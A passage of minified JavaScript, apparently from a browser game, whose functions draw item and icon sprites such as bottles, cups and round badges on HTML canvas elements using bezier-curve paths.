                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(110.57142639160156 * e, 197.09820556640625 * e),
                    r.bezierCurveTo(158.07142639160156 * e, 179.09820556640625 * e, 158.07142639160156 * e, 179.09820556640625 * e, 205.57142639160156 * e, 161.09820556640625 * e),
                    r.bezierCurveTo(205.57142639160156 * e, 235.45535278320312 * e, 205.57142639160156 * e, 235.45535278320312 * e, 205.57142639160156 * e, 309.8125 * e),
                    r.bezierCurveTo(205.57142639160156 * e, 323.8125 * e, 200.57142639160156 * e, 325.8125 * e, 187.57142639160156 * e, 326.8125 * e),
                    r.bezierCurveTo(155.57142639160156 * e, 326.3125 * e, 155.57142639160156 * e, 326.3125 * e, 123.57142639160156 * e, 325.8125 * e),
                    r.bezierCurveTo(111.57142639160156 * e, 326.8125 * e, 109.57142639160156 * e, 321.8125 * e, 110.57142639160156 * e, 312.8125 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 15 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(126.57142639160156 * e, 67.38392639160156 * e),
                    r.bezierCurveTo(126.57142639160156 * e, 57.38392639160156 * e, 132.57142639160156 * e, 54.38392639160156 * e, 140.57142639160156 * e, 54.38392639160156 * e),
                    r.bezierCurveTo(177.57142639160156 * e, 55.38392639160156 * e, 158.07142639160156 * e, 54.38392639160156 * e, 175.57142639160156 * e, 54.38392639160156 * e),
                    r.bezierCurveTo(185.57142639160156 * e, 56.38392639160156 * e, 185.57142639160156 * e, 57.38392639160156 * e, 184.57142639160156 * e, 66.38392639160156 * e),
                    r.bezierCurveTo(184.57142639160156 * e, 78.38392639160156 * e, 184.57142639160156 * e, 89.38392639160156 * e, 184.57142639160156 * e, 90.38392639160156 * e),
                    r.bezierCurveTo(177.57142639160156 * e, 107.38392639160156 * e, 180.57142639160156 * e, 112.38392639160156 * e, 189.57142639160156 * e, 116.38392639160156 * e),
                    r.bezierCurveTo(212.57142639160156 * e, 127.38392639160156 * e, 212.57142639160156 * e, 132.38392639160156 * e, 211.57142639160156 * e, 150.38392639160156 * e),
                    r.bezierCurveTo(211.57142639160156 * e, 227.59821128845215 * e, 211.57142639160156 * e, 227.59821128845215 * e, 211.57142639160156 * e, 304.81249618530273 * e),
                    r.bezierCurveTo(212.57142639160156 * e, 328.81249618530273 * e, 209.57142639160156 * e, 330.81249618530273 * e, 188.57142639160156 * e, 333.81249618530273 * e),
                    r.bezierCurveTo(155.07142639160156 * e, 333.31249618530273 * e, 155.07142639160156 * e, 333.31249618530273 * e, 121.57142639160156 * e, 332.81249618530273 * e),
                    r.bezierCurveTo(104.57142639160156 * e, 327.81249618530273 * e, 105.57142639160156 * e, 328.81249618530273 * e, 104.57142639160156 * e, 312.81249618530273 * e),
                    r.bezierCurveTo(104.57142639160156 * e, 228.16963958740234 * e, 104.57142639160156 * e, 228.16963958740234 * e, 104.57142639160156 * e, 143.52678298950195 * e),
                    r.bezierCurveTo(106.57142639160156 * e, 124.52678298950195 * e, 110.57142639160156 * e, 123.52678298950195 * e, 123.57142639160156 * e, 116.52678298950195 * e),
                    r.bezierCurveTo(136.57142639160156 * e, 110.52678298950195 * e, 130.57142639160156 * e, 106.52678298950195 * e, 126.57142639160156 * e, 98.52678298950195 * e),
                    r.closePath(),
                    he(r, void 0, i[5], 15 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(125.57142639160156 * e, 156.66963958740234 * e),
                    r.bezierCurveTo(125.57142639160156 * e, 182.66963958740234 * e, 125.57142639160156 * e, 182.66963958740234 * e, 125.57142639160156 * e, 208.66963958740234 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 15 * e),
                    n
            }
            function M0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 316 * e,
                    n.height = 365 * e,
                    r.save(),
                    r.translate(156.07142639160156 * e, 51.81248474121094 * e),
                    r.rotate(0),
                    Ve(r, -21.5 * e, -34 * e, 43 * e, 68 * e, 8 * e),
                    r.restore(),
                    he(r, i[1], i[2], 15 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(126.57142639160156 * e, 67.38392639160156 * e),
                    r.bezierCurveTo(126.57142639160156 * e, 57.38392639160156 * e, 132.57142639160156 * e, 54.38392639160156 * e, 140.57142639160156 * e, 54.38392639160156 * e),
                    r.bezierCurveTo(177.57142639160156 * e, 55.38392639160156 * e, 158.07142639160156 * e, 54.38392639160156 * e, 175.57142639160156 * e, 54.38392639160156 * e),
                    r.bezierCurveTo(185.57142639160156 * e, 56.38392639160156 * e, 185.57142639160156 * e, 57.38392639160156 * e, 184.57142639160156 * e, 66.38392639160156 * e),
                    r.bezierCurveTo(184.57142639160156 * e, 78.38392639160156 * e, 184.57142639160156 * e, 89.38392639160156 * e, 184.57142639160156 * e, 90.38392639160156 * e),
                    r.bezierCurveTo(177.57142639160156 * e, 107.38392639160156 * e, 180.57142639160156 * e, 112.38392639160156 * e, 189.57142639160156 * e, 116.38392639160156 * e),
                    r.bezierCurveTo(212.57142639160156 * e, 127.38392639160156 * e, 212.57142639160156 * e, 132.38392639160156 * e, 211.57142639160156 * e, 150.38392639160156 * e),
                    r.bezierCurveTo(211.57142639160156 * e, 227.59821128845215 * e, 211.57142639160156 * e, 227.59821128845215 * e, 211.57142639160156 * e, 304.81249618530273 * e),
                    r.bezierCurveTo(212.57142639160156 * e, 328.81249618530273 * e, 209.57142639160156 * e, 330.81249618530273 * e, 188.57142639160156 * e, 333.81249618530273 * e),
                    r.bezierCurveTo(155.07142639160156 * e, 333.31249618530273 * e, 155.07142639160156 * e, 333.31249618530273 * e, 121.57142639160156 * e, 332.81249618530273 * e),
                    r.bezierCurveTo(104.57142639160156 * e, 327.81249618530273 * e, 105.57142639160156 * e, 328.81249618530273 * e, 104.57142639160156 * e, 312.81249618530273 * e),
                    r.bezierCurveTo(104.57142639160156 * e, 228.16963958740234 * e, 104.57142639160156 * e, 228.16963958740234 * e, 104.57142639160156 * e, 143.52678298950195 * e),
                    r.bezierCurveTo(106.57142639160156 * e, 124.52678298950195 * e, 110.57142639160156 * e, 123.52678298950195 * e, 123.57142639160156 * e, 116.52678298950195 * e),
                    r.bezierCurveTo(136.57142639160156 * e, 110.52678298950195 * e, 130.57142639160156 * e, 106.52678298950195 * e, 126.57142639160156 * e, 98.52678298950195 * e),
                    r.closePath(),
                    he(r, void 0, i[5], 15 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(125.57142639160156 * e, 156.66963958740234 * e),
                    r.bezierCurveTo(125.57142639160156 * e, 182.66963958740234 * e, 125.57142639160156 * e, 182.66963958740234 * e, 125.57142639160156 * e, 208.66963958740234 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 15 * e),
                    n
            }
            function f0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 400 * e,
                    r.translate(0, 15 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(102 * e, 154 * e),
                    r.bezierCurveTo(108 * e, 216.5 * e, 108 * e, 216.5 * e, 114 * e, 279 * e),
                    r.bezierCurveTo(124 * e, 300 * e, 237 * e, 299 * e, 251 * e, 279 * e),
                    r.bezierCurveTo(257 * e, 217 * e, 257 * e, 217 * e, 263 * e, 155 * e),
                    r.bezierCurveTo(248 * e, 194 * e, 91 * e, 180 * e, 103 * e, 156 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(102 * e, 154 * e),
                    r.bezierCurveTo(106 * e, 53 * e, 255 * e, 53 * e, 263 * e, 154 * e),
                    r.bezierCurveTo(248 * e, 38 * e, 99 * e, 69 * e, 103 * e, 154 * e),
                    r.closePath(),
                    he(r, void 0, i[0], 11 * e),
                    r.translate(0, -5 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(103 * e, 154 * e),
                    r.bezierCurveTo(98 * e, 119 * e, 264 * e, 119 * e, 264 * e, 154 * e),
                    r.bezierCurveTo(271 * e, 189 * e, 94 * e, 188 * e, 103 * e, 154 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(102 * e, 154 * e),
                    r.bezierCurveTo(108 * e, 216.5 * e, 108 * e, 216.5 * e, 114 * e, 279 * e),
                    r.bezierCurveTo(124 * e, 300 * e, 237 * e, 299 * e, 251 * e, 279 * e),
                    r.bezierCurveTo(257 * e, 217 * e, 257 * e, 217 * e, 263 * e, 155 * e),
                    r.bezierCurveTo(248 * e, 194 * e, 91 * e, 180 * e, 103 * e, 156 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(182 * e, 185 * e),
                    r.bezierCurveTo(182.5 * e, 237.5 * e, 182.5 * e, 237.5 * e, 183 * e, 290 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(222 * e, 287 * e),
                    r.bezierCurveTo(226 * e, 233.5 * e, 226 * e, 233.5 * e, 230 * e, 180 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(145 * e, 290 * e),
                    r.bezierCurveTo(140.5 * e, 237 * e, 140.5 * e, 237 * e, 136 * e, 184 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 11 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105 * e, 184 * e),
                    r.bezierCurveTo(148 * e, 205 * e, 231 * e, 202 * e, 260 * e, 182 * e),
                    r.bezierCurveTo(259 * e, 195.5 * e, 259 * e, 195.5 * e, 258 * e, 209 * e),
                    r.bezierCurveTo(217 * e, 218 * e, 163 * e, 225 * e, 108 * e, 207 * e),
                    r.closePath(),
                    he(r, i[4], i[2], 11 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(251 * e, 276 * e),
                    r.bezierCurveTo(251.5 * e, 267.5 * e, 251.5 * e, 267.5 * e, 252 * e, 259 * e),
                    r.bezierCurveTo(212 * e, 272 * e, 156 * e, 275 * e, 112 * e, 260 * e),
                    r.bezierCurveTo(112.5 * e, 269 * e, 112.5 * e, 269 * e, 113 * e, 278 * e),
                    r.bezierCurveTo(155 * e, 306 * e, 253 * e, 286 * e, 250 * e, 276 * e),
                    r.closePath(),
                    he(r, i[4], i[2], 11 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(102 * e, 154 * e),
                    r.bezierCurveTo(106 * e, 53 * e, 255 * e, 53 * e, 263 * e, 154 * e),
                    r.bezierCurveTo(248 * e, 38 * e, 99 * e, 69 * e, 103 * e, 154 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 11 * e),
                    n
            }
            function L0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 400 * e,
                    r.translate(0, 15 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(102 * e, 154 * e),
                    r.bezierCurveTo(108 * e, 216.5 * e, 108 * e, 216.5 * e, 114 * e, 279 * e),
                    r.bezierCurveTo(124 * e, 300 * e, 237 * e, 299 * e, 251 * e, 279 * e),
                    r.bezierCurveTo(257 * e, 217 * e, 257 * e, 217 * e, 263 * e, 155 * e),
                    r.bezierCurveTo(248 * e, 194 * e, 91 * e, 180 * e, 103 * e, 156 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(102 * e, 154 * e),
                    r.bezierCurveTo(106 * e, 53 * e, 255 * e, 53 * e, 263 * e, 154 * e),
                    r.bezierCurveTo(248 * e, 38 * e, 99 * e, 69 * e, 103 * e, 154 * e),
                    r.closePath(),
                    he(r, void 0, i[0], 11 * e),
                    r.translate(0, -5 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(103 * e, 154 * e),
                    r.bezierCurveTo(98 * e, 119 * e, 264 * e, 119 * e, 264 * e, 154 * e),
                    r.bezierCurveTo(271 * e, 189 * e, 94 * e, 188 * e, 103 * e, 154 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 12 * e),
                    r.translate(0, 25 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(103 * e, 154 * e),
                    r.bezierCurveTo(98 * e, 119 * e, 264 * e, 119 * e, 264 * e, 154 * e),
                    r.bezierCurveTo(271 * e, 189 * e, 94 * e, 188 * e, 103 * e, 154 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.translate(0, -25 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(102 * e, 154 * e),
                    r.bezierCurveTo(108 * e, 216.5 * e, 108 * e, 216.5 * e, 114 * e, 279 * e),
                    r.bezierCurveTo(124 * e, 300 * e, 237 * e, 299 * e, 251 * e, 279 * e),
                    r.bezierCurveTo(257 * e, 217 * e, 257 * e, 217 * e, 263 * e, 155 * e),
                    r.bezierCurveTo(248 * e, 194 * e, 91 * e, 180 * e, 103 * e, 156 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(182 * e, 185 * e),
                    r.bezierCurveTo(182.5 * e, 237.5 * e, 182.5 * e, 237.5 * e, 183 * e, 290 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(222 * e, 287 * e),
                    r.bezierCurveTo(226 * e, 233.5 * e, 226 * e, 233.5 * e, 230 * e, 180 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(145 * e, 290 * e),
                    r.bezierCurveTo(140.5 * e, 237 * e, 140.5 * e, 237 * e, 136 * e, 184 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 11 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105 * e, 184 * e),
                    r.bezierCurveTo(148 * e, 205 * e, 231 * e, 202 * e, 260 * e, 182 * e),
                    r.bezierCurveTo(259 * e, 195.5 * e, 259 * e, 195.5 * e, 258 * e, 209 * e),
                    r.bezierCurveTo(217 * e, 218 * e, 163 * e, 225 * e, 108 * e, 207 * e),
                    r.closePath(),
                    he(r, i[4], i[2], 11 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(251 * e, 276 * e),
                    r.bezierCurveTo(251.5 * e, 267.5 * e, 251.5 * e, 267.5 * e, 252 * e, 259 * e),
                    r.bezierCurveTo(212 * e, 272 * e, 156 * e, 275 * e, 112 * e, 260 * e),
                    r.bezierCurveTo(112.5 * e, 269 * e, 112.5 * e, 269 * e, 113 * e, 278 * e),
                    r.bezierCurveTo(155 * e, 306 * e, 253 * e, 286 * e, 250 * e, 276 * e),
                    r.closePath(),
                    he(r, i[4], i[2], 11 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(102 * e, 154 * e),
                    r.bezierCurveTo(106 * e, 53 * e, 255 * e, 53 * e, 263 * e, 154 * e),
                    r.bezierCurveTo(248 * e, 38 * e, 99 * e, 69 * e, 103 * e, 154 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 11 * e),
                    n
            }
            function G0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 80 * e,
                    n.height = 160 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    Ve(r, 33 * e, 53 * e, 10 * e, 98 * e, 10 * e),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(-150 * e, -100 * e),
                    r.moveTo(167.5 * e, 171.0625 * e),
                    r.bezierCurveTo(188 * e, 171.0625 * e, 188 * e, 171.0625 * e, 208.5 * e, 171.0625 * e),
                    r.bezierCurveTo(208.5 * e, 156.0625 * e, 208.5 * e, 156.0625 * e, 208.5 * e, 141.0625 * e),
                    r.bezierCurveTo(203.5 * e, 113.0625 * e, 179.5 * e, 96.0625 * e, 167.5 * e, 141.0625 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.restore(),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    Ve(r, 33 * e, 53 * e, 10 * e, 98 * e, 10 * e),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(-150 * e, -100 * e),
                    r.moveTo(167.5 * e, 171.0625 * e),
                    r.bezierCurveTo(188 * e, 171.0625 * e, 188 * e, 171.0625 * e, 208.5 * e, 171.0625 * e),
                    r.bezierCurveTo(208.5 * e, 156.0625 * e, 208.5 * e, 156.0625 * e, 208.5 * e, 141.0625 * e),
                    r.bezierCurveTo(203.5 * e, 113.0625 * e, 179.5 * e, 96.0625 * e, 167.5 * e, 141.0625 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(0 * e, +e),
                    r.moveTo(180.5 * e, 169.0625 * e),
                    r.bezierCurveTo(180.5 * e, 157.5625 * e, 180.5 * e, 157.5625 * e, 180.5 * e, 146.0625 * e),
                    r.bezierCurveTo(181.5 * e, 134.0625 * e, 193.5 * e, 129.0625 * e, 196.5 * e, 146.0625 * e),
                    r.bezierCurveTo(196.5 * e, 157.5625 * e, 196.5 * e, 157.5625 * e, 196.5 * e, 169.0625 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.restore(),
                    n
            }
            function y0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 109 * e,
                    n.height = 110 * e,
                    ke(r, 54.5 * e, 55 * e, 48.038209575038294 * e),
                    he(r, t[0], t[1], 8 * e),
                    0 == i ? (r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(54.928558349609375 * e, 43.72320556640625 * e),
                        r.bezierCurveTo(66.92855834960938 * e, 31.72320556640625 * e, 69.92855834960938 * e, 29.72320556640625 * e, 74.92855834960938 * e, 29.72320556640625 * e),
                        r.bezierCurveTo(86.92855834960938 * e, 28.72320556640625 * e, 91.92855834960938 * e, 42.72320556640625 * e, 89.92855834960938 * e, 52.72320556640625 * e),
                        r.bezierCurveTo(88.92855834960938 * e, 63.72320556640625 * e, 73.92855834960938 * e, 75.72320556640625 * e, 55.928558349609375 * e, 87.72320556640625 * e),
                        r.bezierCurveTo(37.928558349609375 * e, 78.72320556640625 * e, 26.928558349609375 * e, 65.72320556640625 * e, 19.928558349609375 * e, 54.72320556640625 * e),
                        r.bezierCurveTo(13.928558349609375 * e, 42.72320556640625 * e, 21.928558349609375 * e, 28.72320556640625 * e, 35.928558349609375 * e, 29.72320556640625 * e),
                        r.bezierCurveTo(45.928558349609375 * e, 31.72320556640625 * e, 51.928558349609375 * e, 40.72320556640625 * e, 53.928558349609375 * e, 44.72320556640625 * e),
                        r.closePath(),
                        he(r, t[2])) : 1 == i ? (r.save(),
                            r.translate(55 * e, 39.48748779296875 * e),
                            Ve(r, -11.5 * e, -36 * e, 23 * e, 72 * e, 10 * e),
                            r.restore(),
                            he(r, t[2], t[3], 4 * e),
                            ke(r, 54.5 * e, 78.48748779296875 * e, 22.02271554554524 * e),
                            he(r, t[4], t[3], 4 * e),
                            r.save(),
                            r.translate(55.5 * e, 57.287506103515625 * e),
                            Ve(r, -9 * e, -16 * e, 18 * e, 32 * e, 10 * e),
                            r.restore(),
                            he(r, t[4]),
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(66.5 * e, 25.287506103515625 * e),
                            r.bezierCurveTo(60.5 * e, 25.287506103515625 * e, 63.5 * e, 25.287506103515625 * e, 54.5 * e, 25.287506103515625 * e),
                            r.closePath(),
                            he(r, void 0, t[5], 4 * e),
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(66.5 * e, 37.287506103515625 * e),
                            r.bezierCurveTo(60.5 * e, 37.287506103515625 * e, 60.5 * e, 37.287506103515625 * e, 54.5 * e, 37.287506103515625 * e),
                            r.closePath(),
                            he(r, void 0, t[5], 4 * e),
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(66.5 * e, 50.287506103515625 * e),
                            r.bezierCurveTo(61 * e, 50.287506103515625 * e, 61 * e, 50.287506103515625 * e, 55.5 * e, 50.287506103515625 * e),
                            r.closePath(),
                            he(r, void 0, t[5], 4 * e)) : 2 == i ? (r.beginPath(),
                                r.lineCap = "round",
                                r.lineJoin = "round",
                                r.moveTo(45.928558349609375 * e, 55.29463195800781 * e),
                                r.bezierCurveTo(38.928558349609375 * e, 67.29463195800781 * e, 38.928558349609375 * e, 67.29463195800781 * e, 31.928558349609375 * e, 79.29463195800781 * e),
                                r.bezierCurveTo(15.928558349609375 * e, 85.29463195800781 * e, 17.928558349609375 * e, 86.29463195800781 * e, 17.928558349609375 * e, 90.29463195800781 * e),
                                r.bezierCurveTo(19.928558349609375 * e, 94.29463195800781 * e, 21.928558349609375 * e, 94.29463195800781 * e, 27.928558349609375 * e, 92.29463195800781 * e),
                                r.bezierCurveTo(29.928558349609375 * e, 98.29463195800781 * e, 30.928558349609375 * e, 99.29463195800781 * e, 33.928558349609375 * e, 99.29463195800781 * e),
                                r.bezierCurveTo(38.928558349609375 * e, 97.29463195800781 * e, 38.928558349609375 * e, 93.29463195800781 * e, 37.928558349609375 * e, 86.29463195800781 * e),
                                r.bezierCurveTo(45.428558349609375 * e, 73.29463195800781 * e, 51.928558349609375 * e, 64.29463195800781 * e, 52.928558349609375 * e, 60.29463195800781 * e),
                                r.closePath(),
                                he(r, t[2]),
                                r.beginPath(),
                                r.lineCap = "round",
                                r.lineJoin = "round",
                                r.moveTo(55.928558349609375 * e, 8.866058349609375 * e),
                                r.bezierCurveTo(35.928558349609375 * e, 35.866058349609375 * e, 37.928558349609375 * e, 48.866058349609375 * e, 46.928558349609375 * e, 62.866058349609375 * e),
                                r.bezierCurveTo(65.92855834960938 * e, 72.86605834960938 * e, 80.92855834960938 * e, 55.866058349609375 * e, 93.92855834960938 * e, 36.866058349609375 * e),
                                r.closePath(),
                                he(r, t[3], t[4], 6 * e),
                                r.beginPath(),
                                r.lineCap = "round",
                                r.lineJoin = "round",
                                r.moveTo(93.92855834960938 * e, 36.866058349609375 * e),
                                r.bezierCurveTo(82.92855834960938 * e, 37.866058349609375 * e, 77.92855834960938 * e, 36.866058349609375 * e, 67.92855834960938 * e, 28.866058349609375 * e),
                                r.bezierCurveTo(53.928558349609375 * e, 16.866058349609375 * e, 53.928558349609375 * e, 14.866058349609375 * e, 55.928558349609375 * e, 7.866058349609375 * e),
                                r.bezierCurveTo(65.92855834960938 * e, 4.866058349609375 * e, 71.92855834960938 * e, 7.866058349609375 * e, 83.92855834960938 * e, 13.866058349609375 * e),
                                r.bezierCurveTo(96.92855834960938 * e, 21.866058349609375 * e, 95.92855834960938 * e, 31.866058349609375 * e, 92.92855834960938 * e, 36.866058349609375 * e),
                                r.closePath(),
                                he(r, t[3], t[4], 6 * e),
                                r.beginPath(),
                                r.lineCap = "round",
                                r.lineJoin = "round",
                                r.moveTo(68.92855834960938 * e, 16.866058349609375 * e),
                                r.bezierCurveTo(71.92855834960938 * e, 13.866058349609375 * e, 76.92855834960938 * e, 16.866058349609375 * e, 79.92855834960938 * e, 21.866058349609375 * e),
                                r.bezierCurveTo(82.92855834960938 * e, 24.866058349609375 * e, 81.92855834960938 * e, 27.866058349609375 * e, 73.92855834960938 * e, 24.866058349609375 * e),
                                r.bezierCurveTo(67.92855834960938 * e, 20.866058349609375 * e, 66.92855834960938 * e, 19.866058349609375 * e, 67.92855834960938 * e, 17.866058349609375 * e),
                                r.closePath(),
                                he(r, t[2])) : 3 == i && (r.scale(.9, .9),
                                    r.translate(6 * e, 0),
                                    r.beginPath(),
                                    r.lineCap = "round",
                                    r.lineJoin = "round",
                                    r.moveTo(54 * e, .421875 * e),
                                    r.bezierCurveTo(84 * e, 45.421875 * e, 89 * e, 51.421875 * e, 83 * e, 74.421875 * e),
                                    r.bezierCurveTo(74 * e, 95.421875 * e, 46 * e, 98.421875 * e, 30 * e, 78.421875 * e),
                                    r.bezierCurveTo(22 * e, 59.421875 * e, 27 * e, 49.421875 * e, 34 * e, 36.421875 * e),
                                    r.closePath(),
                                    he(r, t[2], t[3], 6 * e),
                                    r.beginPath(),
                                    r.lineCap = "round",
                                    r.lineJoin = "round",
                                    r.moveTo(74 * e, 52.421875 * e),
                                    r.bezierCurveTo(77 * e, 73.421875 * e, 69 * e, 81.421875 * e, 58 * e, 81.421875 * e),
                                    r.bezierCurveTo(66 * e, 71.421875 * e, 70 * e, 66.421875 * e, 74 * e, 52.421875 * e),
                                    r.closePath(),
                                    he(r, t[3])),
                    n
            }
            function H0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 573 * e,
                    n.height = 350 * e,
                    1 == i && (r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(336 * e, 72 * e),
                        r.bezierCurveTo(366 * e, 15 * e, 426 * e, 36 * e, 497 * e, 83 * e),
                        r.bezierCurveTo(522 * e, 85 * e, 522 * e, 85 * e, 547 * e, 87 * e),
                        r.bezierCurveTo(476.5 * e, 205 * e, 476.5 * e, 205 * e, 406 * e, 323 * e),
                        r.bezierCurveTo(297.5 * e, 319 * e, 297.5 * e, 319 * e, 189 * e, 315 * e),
                        r.bezierCurveTo(105.5 * e, 279 * e, 105.5 * e, 279 * e, 22 * e, 243 * e),
                        r.bezierCurveTo(92 * e, 140 * e, 92 * e, 140 * e, 162 * e, 37 * e),
                        r.bezierCurveTo(173 * e, 39 * e, 173 * e, 39 * e, 184 * e, 41 * e),
                        r.bezierCurveTo(185 * e, 38.5 * e, 185 * e, 38.5 * e, 186 * e, 36 * e),
                        r.bezierCurveTo(323 * e, 13 * e, 322 * e, 25 * e, 337 * e, 74 * e),
                        r.closePath(),
                        he(r, t[4], t[4], 35 * e)),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(168 * e, 42 * e),
                    r.bezierCurveTo(255 * e, 60 * e, 255 * e, 60 * e, 342 * e, 78 * e),
                    r.bezierCurveTo(443 * e, 81.5 * e, 443 * e, 81.5 * e, 544 * e, 85 * e),
                    r.bezierCurveTo(475 * e, 204.5 * e, 475 * e, 204.5 * e, 406 * e, 324 * e),
                    r.bezierCurveTo(297.5 * e, 320 * e, 297.5 * e, 320 * e, 189 * e, 316 * e),
                    r.bezierCurveTo(105.5 * e, 279 * e, 105.5 * e, 279 * e, 22 * e, 242 * e),
                    r.closePath(),
                    he(r, t[0], t[1], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(188 * e, 41 * e),
                    r.bezierCurveTo(308 * e, 15 * e, 325 * e, 18 * e, 337 * e, 66 * e),
                    r.bezierCurveTo(191 * e, 305 * e, 196 * e, 286 * e, 184 * e, 307 * e),
                    r.bezierCurveTo(175 * e, 250 * e, 90 * e, 254 * e, 52 * e, 241 * e),
                    r.closePath(),
                    he(r, t[2], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(336 * e, 71 * e),
                    r.bezierCurveTo(375 * e, 8 * e, 429 * e, 50 * e, 518 * e, 92 * e),
                    r.bezierCurveTo(455 * e, 199.5 * e, 455 * e, 199.5 * e, 392 * e, 307 * e),
                    r.bezierCurveTo(227 * e, 301 * e, 261 * e, 255 * e, 188 * e, 308 * e),
                    r.closePath(),
                    he(r, t[2], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(357 * e, 76 * e),
                    r.bezierCurveTo(390 * e, 67 * e, 414 * e, 86 * e, 435 * e, 104 * e),
                    r.bezierCurveTo(417 * e, 135 * e, 417 * e, 135 * e, 399 * e, 166 * e),
                    r.bezierCurveTo(352 * e, 140 * e, 345 * e, 139 * e, 319 * e, 142 * e),
                    r.closePath(),
                    he(r, t[3], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(309 * e, 168 * e),
                    r.bezierCurveTo(345 * e, 163 * e, 372 * e, 180 * e, 412 * e, 203 * e),
                    he(r, t[2], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(263 * e, 54 * e),
